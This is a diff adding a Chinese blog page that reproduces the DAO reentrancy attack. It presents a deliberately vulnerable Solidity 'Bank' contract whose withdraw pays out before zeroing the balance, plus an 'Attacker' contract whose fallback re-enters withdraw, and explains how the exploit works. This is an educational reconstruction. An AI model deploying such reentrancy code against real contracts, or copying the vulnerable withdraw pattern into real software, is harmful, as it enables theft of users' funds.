@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>The DAO重入漏洞重现 | Renne&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近恰好被问到一些关于以太坊漏洞的问题，干脆就去用代码简单演练一下加深印象。以太坊the Dao事件是利用了智能合约里的一个重入漏洞，其本质是the DAO智能合约的代码有可能会一些仍未部署到链上的未知的代码。 这里有两个很简单的智能合约，solidity版本为0.5.17。">
+<meta name="keywords" content="区块链,以太坊,智能合约,漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The DAO重入漏洞重现">
+<meta property="og:url" content="http://yoursite.com/2020/03/20/2020-03-20-ethereum-the-dao/index.html">
+<meta property="og:site_name" content="Renne&#39;s Blog">
+<meta property="og:description" content="最近恰好被问到一些关于以太坊漏洞的问题，干脆就去用代码简单演练一下加深印象。以太坊the Dao事件是利用了智能合约里的一个重入漏洞，其本质是the DAO智能合约的代码有可能会一些仍未部署到链上的未知的代码。 这里有两个很简单的智能合约，solidity版本为0.5.17。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-03-18T12:21:39.099Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="The DAO重入漏洞重现">
+<meta name="twitter:description" content="最近恰好被问到一些关于以太坊漏洞的问题，干脆就去用代码简单演练一下加深印象。以太坊the Dao事件是利用了智能合约里的一个重入漏洞，其本质是the DAO智能合约的代码有可能会一些仍未部署到链上的未知的代码。 这里有两个很简单的智能合约，solidity版本为0.5.17。">
+  
+    <link rel="alternate" href="/atom.xml" title="Renne&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+	<div id="header-touxiang"></div>
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Renne&#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">built on 2019-06-20</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2020-03-20-ethereum-the-dao" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/20/2020-03-20-ethereum-the-dao/" class="article-date">
+  <time datetime="2020-03-20T09:23:09.000Z" itemprop="datePublished">2020-03-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/区块链/">区块链</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      The DAO重入漏洞重现
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近恰好被问到一些关于以太坊漏洞的问题，干脆就去用代码简单演练一下加深印象。以太坊the Dao事件是利用了智能合约里的一个重入漏洞，其本质是the DAO智能合约的代码有可能会一些仍未部署到链上的未知的代码。</p>
+<p>这里有两个很简单的智能合约，solidity版本为0.5.17。</p>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.22 &lt;0.6.0;</span><br><span class="line"></span><br><span class="line">contract Bank&#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balances;</span><br><span class="line">    constructor() public payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function wallet() view public returns(uint256 result)  &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    function recharge() payable public &#123;</span><br><span class="line">        balances[msg.sender]+=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw() public&#123;</span><br><span class="line">        if (balances[msg.sender] &gt; 0)&#123;</span><br><span class="line">            msg.sender.call.value(balances[msg.sender])(&quot;&quot;);</span><br><span class="line">            balances[msg.sender] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender]=0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    address public bankAddr;</span><br><span class="line">    uint public attackCount = 0;</span><br><span class="line">    uint public moneyGet = 0;</span><br><span class="line"></span><br><span class="line">    constructor(address _bank) public&#123;</span><br><span class="line">        bankAddr = _bank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable&#123;</span><br><span class="line">        Bank bank = Bank(bankAddr);</span><br><span class="line">        bank.recharge.value(msg.value)();</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () external payable&#123;</span><br><span class="line">        if(msg.sender==bankAddr&amp;&amp;attackCount&lt;5)&#123;</span><br><span class="line">            attackCount += 1;</span><br><span class="line">            moneyGet += msg.value;</span><br><span class="line">            Bank bank = Bank(bankAddr);</span><br><span class="line">            bank.withdraw();</span><br><span class="line">            log0(&quot;your asshole has been kicked&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接解释一下上面的代码，合约Bank模拟当时的取钱的合约，recharge表示存钱，withdraw表示取钱。重点说一下withdraw一些奇怪的部分，它是先送钱，然后再置零。call.value()这个函数，会返回一个闭包，执行这个闭包就会发起像目标地址的交易，参数为data域。对于普通用户，data域没有作用；而对于合约用户，data域就代表你调用的函数，如果调用失败或者为空，就会调用默认无函数名的函数(fallback)。</p>
+<p>其实solidity 5.0版本已经稍稍修复了一点这样的问题，让程序员再写智能合约的时候，很明确自己会调用了什么。</p>
+<p>接下来解释一下Attacker合约，首先得先输入地址定义是哪个bank合约。然后调用attack，先转给它一笔钱，然后全部提取出来。如果账户是个普通用户，提取时就直接取钱完事了；但如果是个合约账户，执行call时，就会执行改合约的fallback函数，而此时并未在合约中将该用户的钱置为0，因此就会出现递归提取的现象。</p>
+<p>执行的过程很简单，首先创建一个Bank，然后记录下创建的bank地址，接着运行attack函数就实现了重入攻击了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/20/2020-03-20-ethereum-the-dao/" data-id="ck803f1hu004c80tmaffspim5" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/以太坊/">以太坊</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/区块链/">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/智能合约/">智能合约</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/03/22/2020-03-22-fabric-contract-deploy/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          超级账本 合约调试与部署
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/03/18/2020-03-18-namecoin-regtest-deploy/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">本地namecoin dns搭建</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/区块链/">区块链</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/大数据/">大数据</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/密码学/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/机器学习/">机器学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/根域名/">根域名</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程语言/">编程语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DHT/">DHT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arch/">arch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blockstack/">blockstack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fabric/">fabric</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/">go</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/namecoin/">namecoin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/">node.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zookeeper/">zookeeper</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/以太坊/">以太坊</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大数据/">大数据</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/实验/">实验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数学/">数学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/智能合约/">智能合约</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/根域名/">根域名</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/概率论/">概率论</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/比特币/">比特币</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/源码/">源码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程语言/">编程语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/联盟链/">联盟链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/虚拟机/">虚拟机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/超级账本/">超级账本</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/DHT/" style="font-size: 10px;">DHT</a> <a href="/tags/DNS/" style="font-size: 16.67px;">DNS</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/arch/" style="font-size: 14.44px;">arch</a> <a href="/tags/blockstack/" style="font-size: 12.22px;">blockstack</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/docker/" style="font-size: 12.22px;">docker</a> <a href="/tags/fabric/" style="font-size: 12.22px;">fabric</a> <a href="/tags/github/" style="font-size: 11.11px;">github</a> <a href="/tags/go/" style="font-size: 12.22px;">go</a> <a href="/tags/linux/" style="font-size: 18.89px;">linux</a> <a href="/tags/namecoin/" style="font-size: 13.33px;">namecoin</a> <a href="/tags/node-js/" style="font-size: 12.22px;">node.js</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/zookeeper/" style="font-size: 10px;">zookeeper</a> <a href="/tags/以太坊/" style="font-size: 17.78px;">以太坊</a> <a href="/tags/区块链/" style="font-size: 20px;">区块链</a> <a href="/tags/大数据/" style="font-size: 11.11px;">大数据</a> <a href="/tags/实验/" style="font-size: 13.33px;">实验</a> <a href="/tags/密码学/" style="font-size: 13.33px;">密码学</a> <a href="/tags/数学/" style="font-size: 13.33px;">数学</a> <a href="/tags/智能合约/" style="font-size: 12.22px;">智能合约</a> <a href="/tags/机器学习/" style="font-size: 12.22px;">机器学习</a> <a href="/tags/根域名/" style="font-size: 15.56px;">根域名</a> <a href="/tags/概率论/" style="font-size: 11.11px;">概率论</a> <a href="/tags/比特币/" style="font-size: 12.22px;">比特币</a> <a href="/tags/源码/" style="font-size: 11.11px;">源码</a> <a href="/tags/漏洞/" style="font-size: 10px;">漏洞</a> <a href="/tags/算法/" style="font-size: 14.44px;">算法</a> <a href="/tags/编程语言/" style="font-size: 11.11px;">编程语言</a> <a href="/tags/联盟链/" style="font-size: 13.33px;">联盟链</a> <a href="/tags/虚拟机/" style="font-size: 10px;">虚拟机</a> <a href="/tags/超级账本/" style="font-size: 11.11px;">超级账本</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/03/27/2020-03-27-namecoin-regtest-deploy-simpified/">本地namecoin dns搭建(极简版)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/22/2020-03-22-fabric-contract-deploy/">超级账本 合约调试与部署</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/2020-03-20-ethereum-the-dao/">The DAO重入漏洞重现</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/18/2020-03-18-namecoin-regtest-deploy/">本地namecoin dns搭建</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/12/2020-03-12-hyperledger-fabric-network-running/">超级账本 网络搭建</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 Renne<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
